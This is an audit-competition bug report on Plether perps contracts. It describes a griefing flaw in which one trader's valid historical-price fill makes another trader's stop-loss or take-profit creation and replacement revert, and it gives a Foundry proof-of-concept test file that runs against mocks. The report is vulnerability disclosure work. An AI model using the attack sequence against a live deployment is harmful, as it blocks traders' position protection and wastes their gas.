# \#99622 [SC-Low] A valid historical fill makes another trader's protection creation and replacement revert

**Submitted on Nov 14th 2026 at 14:33:00 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99622
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An attacker can interrupt another trader's stop-loss and take-profit management by filling an ordinary delayed order with a valid historical Pyth price. The fill advances the Engine's mark timestamp but leaves `PletherOracle`'s accepted live basket at its earlier timestamp. Protection creation and replacement read that accepted basket and revert `PletherOracle__PriceOutOfOrder` because it is behind the Engine mark. The trader must get a qualifying live basket accepted and then submit the protection call again. Another valid fill can recreate the gap after that refresh.


## Vulnerability Details
The Engine mark and the Oracle's accepted live basket are separate records. A live `updateMarkPrice` synchronizes them. Delayed-order execution takes a different path: `PletherOracle._resolveHistoricalOrderBasket` parses the unique price published after the order's commit time and updates Pyth's stored feeds, but does not write PletherOracle's accepted live basket ([PletherOracle.sol, lines 596–645](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L645)). The Router then installs the historical basket as the Engine mark when its publish time is newer ([OrderRouterExecutionSidecar.sol, lines 1053–1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1061)).

Mallory and Alice hold separate positions. After a live refresh has synchronized both records, Mallory commits and executes a valid order at the FIFO head using an eligible post-commit historical Pyth basket. For example, the accepted basket can remain at timestamp `100` while the fill moves `engine.lastMarkTime` to `101`. Mallory does not interact with Alice's account.

Alice calls `createPositionProtection` to arm a stop-loss or take-profit, or `replacePositionProtection` to change one already armed. Both calls reach `PositionProtectionBook._freshProtectionObservation`, which obtains the Oracle's current accepted `MarkRefresh` snapshot ([PositionProtectionBook.sol, lines 207–230 and 257–295](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L207-L295)). `PletherOracle._snapshotFromBasket` requires that snapshot's publish time to be at least the Engine mark time. With accepted time `100` and Engine time `101`, it reverts `PletherOracle__PriceOutOfOrder(100, 101)` before Alice can create or replace the protection ([PletherOracle.sol, lines 878–903](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L878-L903)).

An empty-data `updateMarkPrice` replays the older accepted basket and also reverts. Alice or any keeper can repair the state by submitting valid live Pyth data through `updateMarkPrice`, bringing the accepted basket up to the Engine mark, then retrying Alice's protection call. The PoC completes that repair in the same timestamp. Mallory can repeat the fill after a refresh and reopen the gap.

## Impact Details
The [Immunefi impact table](https://immunefi.com/audit-competition/plether/scope/) places griefing that damages users under Medium. Here, Mallory's valid trade makes Alice's documented protection-management transaction fail and spend gas. If Alice is arming her first stop-loss, the position remains without that protection until a live refresh and successful retry. If she is replacing an existing protection, the old triggers and limits remain in effect instead of her new instructions. A subsequent attacker fill can force the same refresh-and-retry sequence again.

Mallory does not need permission over Alice's position or the Oracle configuration. She pays the normal costs of her order and must provide eligible signed Pyth data. The failure is an interruption of creation and replacement; the position and any existing protection remain intact.

----

### Note:
Cecuro MED-23 concerned a mixed-time basket preventing an already-armed protection from triggering, while MED-28 concerned an accepted Oracle basket ahead of a stale Engine mark. This finding follows the reverse transition: a successful historical fill moves the **Engine ahead of the accepted basket**, so a different trader cannot create or replace protection until the two records are synchronized.

## Proof of Concept

## Proof of Concept

Attach the single file [IndependentHistoricalMarkProtection.t.sol](IndependentHistoricalMarkProtection.t.sol), place it at `packages/perps/test/poc/` in the competition checkout, and run from the repository root:

```bash
forge test test/poc/IndependentHistoricalMarkProtection.t.sol --root packages/perps --offline --out out-independent-mark-protection --cache-path cache-independent-mark-protection -vv
```

All three tests pass against the pinned commit using the repository's MockPyth fixture:

- `test_OtherTraderHistoricalFillBlocksProtectionButSameSecondRefreshRepairs` proves Alice can create protection before Mallory's fill, receives `PriceOutOfOrder` afterward, cannot repair it with an empty update, and succeeds after a full live refresh.
- `test_OtherTraderHistoricalFillAlsoBlocksReplacementUntilRefresh` proves the same failure and repair for an existing protection's replacement.
- `test_OtherTraderCanRecreateTheGapAfterEachLiveRefresh` repeats the fill, failed protection call, and live refresh twice.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {OrderRouterTestBase} from "../perps/shared/OrderRouterTestBase.sol";

/// @notice Independent cross-account check of INS-17 on the pinned competition commit.
contract IndependentHistoricalMarkProtectionTest is OrderRouterTestBase {
    address internal attacker = address(0x333);

    function _livePayload(uint256 price) internal returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _params() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = 90_000_000;
        params.stopLossTriggerPrice = 110_000_000;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _open(address trader) internal {
        vm.prank(trader);
        uint64 order = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 1000e6, 1, false);
        bytes[] memory data = _mockPythUpdateData();
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(order, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "opening order executed");
    }

    function _prepare() internal {
        settlementToken.mint(attacker, 10_000e6);
        vm.startPrank(attacker);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(attacker, 10_000e6);
        vm.deal(attacker, 10 ether);
        vm.stopPrank();

        _open(alice);
        _open(attacker);
        vm.warp(vm.getBlockTimestamp() + 5);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_livePayload(1e8));
        (bool accepted,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
        assertTrue(accepted, "live basket accepted");
        assertEq(engine.lastMarkTime(), acceptedTime, "baseline marks synchronized");
    }

    function test_OtherTraderHistoricalFillBlocksProtectionButSameSecondRefreshRepairs() public {
        _prepare();
        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        uint256 baseline = vm.snapshotState();
        vm.prank(alice);
        uint64 baselineId = actions.createPositionProtection(_params());
        assertGt(baselineId, 0, "victim can arm baseline protection");
        assertTrue(vm.revertToState(baseline), "restore baseline");

        vm.prank(attacker);
        uint64 order = router.commitOrder(CfdTypes.Side.LONG, 1_000e18, 100e6, 1, false);
        bytes[] memory historical = _mockPythUpdateData();
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(order, historical);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "attacker fill executed");

        (bool accepted,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
        uint64 engineTime = engine.lastMarkTime();
        assertTrue(accepted, "accepted basket remains present");
        assertGt(engineTime, acceptedTime, "attacker's fill advanced Engine beyond accepted basket");
        uint256 blockedAt = vm.getBlockTimestamp();

        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime));
        actions.createPositionProtection(_params());

        bytes[] memory empty;
        vm.expectRevert(abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime));
        router.updateMarkPrice(empty);

        // There is no time lock: the victim or any keeper can install a current live basket
        // in the same timestamp, then arm protection in the next transaction.
        router.updateMarkPrice(_livePayload(1e8));
        assertEq(vm.getBlockTimestamp(), blockedAt, "repair did not require time advance");
        vm.prank(alice);
        uint64 repairedId = actions.createPositionProtection(_params());
        assertGt(repairedId, 0, "victim can arm after same-second refresh");
    }

    function test_OtherTraderHistoricalFillAlsoBlocksReplacementUntilRefresh() public {
        _prepare();
        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        vm.prank(alice);
        uint64 protectionId = actions.createPositionProtection(_params());

        vm.prank(attacker);
        uint64 order = router.commitOrder(CfdTypes.Side.LONG, 1_000e18, 100e6, 1, false);
        bytes[] memory historical = _mockPythUpdateData();
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(order, historical);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "attacker fill executed");

        (,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
        uint64 engineTime = engine.lastMarkTime();
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime));
        actions.replacePositionProtection(protectionId, _params());

        router.updateMarkPrice(_livePayload(1e8));
        vm.prank(alice);
        actions.replacePositionProtection(protectionId, _params());
    }

    function test_OtherTraderCanRecreateTheGapAfterEachLiveRefresh() public {
        _prepare();
        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));

        for (uint256 i; i < 2; ++i) {
            vm.warp(vm.getBlockTimestamp() + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(attacker);
            uint64 order = router.commitOrder(CfdTypes.Side.LONG, 1_000e18, 100e6, 1, false);
            bytes[] memory historical = _mockPythUpdateData();
            vm.roll(vm.getBlockNumber() + 1);
            OrderV3Types.ExecutionResult memory result = router.executeOrder(order, historical);
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
            (,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
            uint64 engineTime = engine.lastMarkTime();
            assertGt(engineTime, acceptedTime);

            uint256 beforeGas = gasleft();
            vm.prank(alice);
            vm.expectRevert(abi.encodeWithSelector(
                IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime
            ));
            actions.createPositionProtection(_params());
            emit log_named_uint("failed protection call gas including test overhead", beforeGas - gasleft());

            router.updateMarkPrice(_livePayload(1e8));
            (,, uint64 refreshedTime) = router.pletherOracle().getAcceptedBasketMark();
            assertEq(engine.lastMarkTime(), refreshedTime);
        }

        vm.prank(alice);
        assertGt(actions.createPositionProtection(_params()), 0);
    }
}
```
